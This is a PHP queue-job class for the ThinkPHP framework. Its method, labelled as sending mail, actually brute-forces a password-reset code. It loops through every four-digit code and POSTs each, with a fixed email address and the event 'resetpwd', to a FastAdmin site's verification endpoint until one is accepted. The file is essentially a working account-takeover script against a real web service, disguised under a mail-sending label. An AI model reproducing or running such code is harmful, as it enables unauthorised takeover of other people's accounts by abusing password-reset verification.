<?php
/**
 * Created by PhpStorm.
 * User: yiliu
 * Date: 2018/6/12
 * Time: 下午3:44
 */

namespace app\fyxbl\job;

use think\queue\Job;
use think\Exception;

class fuckyou
{
    /**
     * fire方法是消息队列默认调用的方法
     * @param Job $job 当前的任务对象
     * @param $data 发布任务时自定义的数据
     */
    public function fire(Job $job, $data)
    {


        $isJobDone = $this->sendMail($data);

        print ("开始执行程序" . time());
        //执行发送邮件


        //如果发送成功  就删除队列
        if ($isJobDone) {
            print ("任务执行成功,,已经删除!");
            $job->delete();
        } else {
            //如果执行到这里的话 说明队列执行失败  如果失败三次就删除该任务  否则重新执行
            print ("任务执行失败!");
            if ($job->attempts() > 3) {
                print ("删除任务!");
                $job->delete();
            } else {
                print ("<info>重新执行!第" . $job->attempts() . "次重新执行!</info>\n");
                $job->release(); //重发任务
            }
        }
    }

    /**
     * 发送邮件
     * @param $data
     * @return bool
     */
    private function sendMail($data)
    {
        try {
            $email = 'fyxgzs@qq.com';
            print_r($email);
            for ($x=1000; $x<=9999; $x++) {
                $a = $this->http_curl('https://www.fastadmin.net/api/validate/check_ems_correct.html', ['captcha' => $x, "email" => $email , "event" => 'resetpwd'], 'POST', null);
                print("-：$x");
                if (json_decode($a)->code){
                    print('！！！！！正确验证码验证码'.$x);
                    return true;
                    break;
                }
            }
        } catch (Exception $e) {
            return false;
        }
    }

    private function http_curl($url, $data, $mode = "POST", $cookie)
    {
        $ch = curl_init($url); //初始化
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $mode);
        curl_setopt($ch, CURLOPT_HEADER, 0); //不返回header部分
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //返回字符串，而非直接输出
        if ($cookie != null) curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); //读取cookies
        if ($data != null) curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }


}